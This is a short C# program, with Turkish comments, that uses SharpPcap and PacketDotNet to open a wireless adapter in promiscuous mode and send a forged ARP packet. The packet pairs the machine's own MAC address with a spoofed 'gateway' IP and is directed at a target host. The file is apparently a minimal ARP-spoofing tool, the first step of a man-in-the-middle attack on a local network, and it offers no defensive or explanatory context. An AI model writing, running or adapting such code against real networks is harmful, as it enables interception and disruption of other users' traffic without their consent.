using PacketDotNet;
using SharpPcap;
using System;
using System.Net;
using System.Net.NetworkInformation;



string deviceName = "MediaTek Wi-Fi 6 MT7921 Wireless LAN Card"; // Network cihazi
string targetIP = "127.0.0.1"; // hedef
string spoofIP = "127.0.0.1"; // spoof. gateway adresi
var devices = CaptureDeviceList.Instance.Where(x => x.Description == deviceName).First();

foreach (var dev in CaptureDeviceList.Instance)
{
    Console.WriteLine("MacAddress:" + dev.MacAddress + " | Description:" + dev.Description);

}

var device = CaptureDeviceList.Instance[devices.Name];
device.Open(DeviceModes.Promiscuous);

var ethernetPacket = new EthernetPacket(device.MacAddress,
PhysicalAddress.Parse("00-00-00-00-00-00"),
EthernetType.Arp);

var arpPacket = new ArpPacket(ArpOperation.Request,
PhysicalAddress.Parse("00-00-00-00-00-00"),
IPAddress.Parse(spoofIP),
device.MacAddress,
IPAddress.Parse(targetIP));

ethernetPacket.PayloadPacket = arpPacket;

device.SendPacket(ethernetPacket);

device.Close();